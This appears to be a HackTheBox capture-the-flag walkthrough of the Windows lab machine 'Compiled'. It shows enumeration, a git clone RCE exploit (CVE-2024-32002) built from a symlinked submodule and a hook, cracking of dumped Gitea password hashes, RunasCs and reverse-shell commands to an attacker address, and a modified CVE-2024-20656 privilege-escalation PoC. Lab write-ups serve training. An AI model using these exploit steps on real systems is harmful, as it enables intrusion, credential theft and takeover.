---
title: "Compiled"
type: docs
prev: docs/cybersecurity/hackthebox
---

## Hints

- **Shell Hint:** 2024 CVE related to the process required for the functionality of port 5000.
- **User Hint:** File with a crackable hash.
- **Root Hint:** 2024 privilege escalation CVE related to VSCode.

---

This will be a walkthrough of `Compiled`, a medium difficulty Windows machine from `HackTheBox`.

## Enumeration

### Nmap

We begin with an Nmap scan to gather our bearings.

```bash
nmap -sVC -T4 compiled.htb -Pn
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-29 22:01 +03
Nmap scan report for compiled.htb (10.10.11.26)
Host is up (0.11s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
3000/tcp open  http?
5000/tcp open  http?
...
```

### Web

We can visit the sites to confirm that they are indeed HTTP services. Another option is to use EyeWitness, a handy tool for evaluating webpages, especially when dealing with multiple hosts.

```bash
echo "http://compiled.htb:3000 \nhttp://compiled.htb:5000" > compiled_sites.txt
```

```bash
eyewitness -f compiled_sites.txt
```

Upon visiting the sites, we observe:

| ![Gitea](/images/hackthebox/compiled/gitea_home.png) | ![Compiled](/images/hackthebox/compiled/compiled_home.png) |
| :----------------------------------------------------------: | :-------------------------------------------------------------: |
| *Gitea Site*                                                 | *Custom Web App called 'Compiled'*                              |

Notably, the custom web app requests a URL to a GitHub repository to compile.

---
---
<img src="/images/hackthebox/compiled/compiled_urlsubmit.png" alt="URL Submission" style="width: 800px;">

I tend to run some directory brute-force scans in the background when I discover websites. The one running for the Gitea site found some interesting directories.

```bash
feroxbuster --url http://compiled.htb:5000 -r -t 100 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404,403,400,503,500,501,502 -x txt,sh,zip,bak,py,php --dont-scan "vendor,fonts,images,css,assets,docs,js,static,img,help"
```

```bash
200      GET      12l       73w      704c http://compiled.htb:3000/api/swagger
200      GET      312l     934w    11383c http://compiled.htb:3000/user/sign_up
200      GET      311l     926w    11113c http://compiled.htb:3000/user/login
200      GET      378l    1782w    18671c http://compiled.htb:3000/explore/repos
```

Visiting `http://compiled.htb:3000/explore/repos`, we find the source code for a site that compiles code by cloning a repository and compiling locally. This site shares a name with the site hosted at `http://compiled.htb:5000`.

![Explore Repos](/images/hackthebox/compiled/explore_repos.png)

At `http://compiled.htb:3000/richard/Compiled/src/branch/main/app.py`, we find a Flask app whose behavior matches that of the Compiled site.

```python
from flask import Flask, request, render_template, redirect, url_for
import os

app = Flask(__name__)

# Configuration
REPO_FILE_PATH = r'C:\Users\Richard\source\repos\repos.txt'

@app.route('/', methods=['GET', 'POST'])
def index():
    error = None
    success = None
    if request.method == 'POST':
        repo_url = request.form['repo_url']
        if # Add a sanitization to check for valid Git repository URLs.
            with open(REPO_FILE_PATH, 'a') as f:
                f.write(repo_url + '\n')
            success = 'Your git repository is being cloned for compilation.'
        else:
            error = 'Invalid Git repository URL. It must start with "http://" and end with ".git".'
    return render_template('index.html', error=error, success=success)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

Initially, thoughts of path traversal, LFI, or filter bypassing crossed my mind, as did getting a shell to compile and then be run since the website states that we can "view our results," implying that there may be some form of execution. None of these paths seemed promising after some probing. Searching for "git compile RCE," we find a promising, recent post titled "[Exploiting CVE-2024-32002: RCE via git clone] (https://amalmurali.me/posts/git-rce/)".

## Foothold

### Gitea Setup

Following the exploitation process described in the blog post, we see that we need two accessible repositories and a victim to recursively clone one of those repositories.

Luckily, we have a Gitea instance accessible. We create an account on the instance:

![Registration](/images/hackthebox/compiled/register.png)

and then make two repositories:

![Make Repos](/images/hackthebox/compiled/newrepo.png)
![Repo Made](/images/hackthebox/compiled/reposmade.png)

### Repository Setup

**Initial:**
```bash
git config --global protocol.file.allow always
git config --global core.symlinks true
git config --global init.defaultBranch main
```

**Setting Up the Staging Repository:**

1. Clone and enter the repository.
2. Create the directory `y` and subdirectory `y/hooks/`.
3. Within `y/hooks/`, create the file `post-checkout` with the following content:

```sh
#!bin/sh.exe
*payload here*
```

I chose to use the bash Base64 encoded payload from `revshells.com`.

4. Make the newly created file executable:

```bash
chmod +x y/hooks/post-checkout
```

**Setting Up the Executing Repository:**

1. Clone the second repository and enter it.
2. Add the other repository as a submodule:

```bash
git submodule add --name x/y "http://compiled.htb:3000/djasper/staging.git" A/modules/x
```

3. Commit this change and then run:

```bash
printf ".git" > dotgit.txt
git hash-object -w --stdin < dotgit.txt > dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
git update-index --index-info < index.info
```

This is the crux of the exploit, let's break it down a bit:

- (a) Create a file named `dotgit.txt` containing the string `.git`:

   ```bash
   printf ".git" > dotgit.txt
   ```

   This command writes the string `.git` to a file named `dotgit.txt`. This file will be used in the next step to generate a Git object.

- (b) Generate a Git hash object from the contents of `dotgit.txt`:

   ```bash
   git hash-object -w --stdin < dotgit.txt > dot-git.hash
   ```

   Here, the `git hash-object` command reads the contents of `dotgit.txt` and creates a Git blob object. The `-w` flag writes this object to the Git object database, and the resulting hash is saved in the file `dot-git.hash`.

- (c) Prepare an index entry for the Git submodule with the symlink pointing to the `.git` directory:

   ```bash
   printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
   ```

   This command formats a string with the appropriate Git index entry for a symlink. The mode `120000` indicates a symlink, and the hash of the object created in the previous step is inserted into the string. The result is saved to `index.info`.

- (d) Update the Git index with the new entry from `index.info`:

   ```bash
   git update-index --index-info < index.info
   ```

Finally, the `git update-index` command reads the formatted string from `index.info` and updates the Git index with this new entry. This effectively adds a symlink in the repository that points to the `.git` directory of the submodule.

By creating a symlink to the `.git` directory, this setup can trick the victim into executing malicious hooks or commands when they interact with the repository. This specific manipulation allows the attacker to execute code on the victim's machine when the repository is cloned and checked out, leveraging Git's behavior with submodules and symlinks.

4. Commit this and push the changes.

**Triggering the Exploit**

We visit `http://compiled.htb:5000`, where the compilation app is hosted, and submit the `.git` URL of the second repository to execute the cloning and receive our reverse shell. This may need to be done multiple times due to inconsistencies with the server.

## User Shell

After enumerating the host, we find `C:/Program Files/Gitea/data` with the file `Gitea.db`.

```bash
PS C:\Program Files\Gitea\data> ls

Directory: C:\Program Files\Gitea\data

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         5/22/2024   8:08 PM                actions_artifacts
d-----         5/22/2024   8:08 PM                actions_log
d-----         5/22/2024   8:08 PM                attachments
d-----         5/22/2024   8:08 PM                avatars
d-----         7/29/2024  10:26 PM                gitea-repositories
d-----         5/22/2024   8:08 PM                home
d-----         5/22/2024   8:08 PM                indexers
d-----         5/22/2024   8:08 PM                jwt
d-----         5/22/2024   8:08 PM                lfs
d-----         5/22/2024   8:08 PM                packages
d-----         5/22/2024   8:08 PM                queues
d-----         5/22/2024   8:08 PM                repo-archive
d-----         5/22/2024   8:08 PM                repo-avatars
d-----         7/29/2024   9:26 PM                sessions
d-----         5/24/2024   5:32 PM                tmp
-a----         7/29/2024  10:27 PM        2023424 gitea.db
```

Downloading this file, we get:

```sql
sqlite> select * from user;
1|administrator|administrator||administrator@compiled.htb|0|enabled|1bf0a9561cf076c5fc0d76e140788a91b5281609c384791839fd6e9996d3bbf5c91b8eee6bd5081e42085ed0be779c2ef86d|pbkdf2$50000$50|0|0|0||0|||6e1a6f3adbe7eab92978627431fd2984|a45c43d36dce3076158b19c2c696ef7b|en-US||1716401383|1716669640|1716669640|0|-1|1|1|0|0|0|1|0||administrator@compiled.htb|0|0|0|0|0|0|0|0|0||arc-green|0
2|richard|richard||richard@compiled.htb|0|enabled|4b4b53766fe946e7e291b106fcd6f4962934116ec9ac78a99b3bf6b06cf8568aaedd267ec02b39aeb244d83fb8b89c243b5e|pbkdf2$50000$50|0|0|0||0|||2be54ff86f147c6cb9b55c8061d82d03|d7cf2c96277dd16d95ed5c33bb524b62|en-US||1716401466|1720089561|1720089548|0|-1|1|0|0|0|0|1|0||richard@compiled.htb|0|0|0|0|2|0|0|0|0||arc-green|0
4|emily|emily||emily@compiled.htb|0|enabled|97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16|pbkdf2$50000$50|1|0|0||0|||0056552f6f2df0015762a4419b0748de|227d873cca89103cd83a976bdac52486|||1716565398|1716567763|0|0|-1|1|0|0|0|0|1|0||emily@compiled.htb|0|0|0|0|0|0|0|2|0||arc-green|0
6|temp|temp||temp@temp.com|0|enabled|716e816c94cd603e6290e3ae6ecd275093c8a690a6668af1d987609df488a353f579bbaf25cec44ab1ca6483a8fff6fc8d71|pbkdf2$50000$50|0|0|0||0|||3da88239bd34cf2d6a4d43be87140843|ddd92ee4843aa73505ac9ed103f70c25|en-US||1722146269|1722146337|1722146269|0|-1|1|0|0|0|0|1|0||temp@temp.com|0|0|0|0|2|0|0|0|0||arc-green|0
```

To crack these hashes, we convert the hash and the salt to base64, giving us the hashes that look like:

```
sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka3+rUAzCyqmqvHzNiHQ1zIo/BY=
```

We run:

```bash
hashcat -a 0 -m 10900 hashes.txt rockyou.txt --show
```

Which yields`12345678` as Emily's password:

```
sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka3+rUAzCyqmqvHzNiHQ1zIo/BY=:12345678
```
We use `RunasCs.exe` to catch a shell as Emily from our non-interactive compiler shell.

```bash
.\RunasCs.exe Emily 12345679 powershell -r ip:port
```

## Privilege Escalation

After some enumeration, we find the `VSStandardCollectorService150` service. Searching the internet yields another recent [CVE for LPE](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/). The [PoC widely available](https://github.com/Wh04m1001/CVE-2024-20656) needs a few small edits, namely to change the MS VSCode version in line 4 to match the appropriate date:

```c
WCHAR cmd[] = L"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe";
```

and to change the executed command (line 187) to be a reverse shell, as we don't have RDP access to the computer, and thus lack the ability to abuse an elevated shell:

```c
CopyFile(L"c:\\windows\\system32\\cmd.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);
```

to:

```c
CopyFile(L"c:\\temp\\reverse.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);
```

Compile the exploit with VS Code C++ Release on release mode. Then transfer and execute the binary.

Catch your shell and gain root access!

### PostScript

Thank you for reading. If you enjoyed the walkthrough and learned something along the way, please drop a respect on my [HackTheBox Profile](https://app.hackthebox.com/profile/1001444) or check out more of my content which will be forthcoming.
